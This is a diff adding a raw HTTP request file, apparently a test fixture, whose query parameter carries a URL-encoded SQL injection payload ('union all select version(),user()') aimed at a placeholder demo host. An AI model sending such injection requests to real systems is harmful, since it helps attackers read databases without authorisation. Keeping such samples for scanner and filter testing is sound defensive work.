@@ -1,0 +1,4 @@
+GET /a?s=1\u0027%20union%20all%20select%20version(),user(),3--%20- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
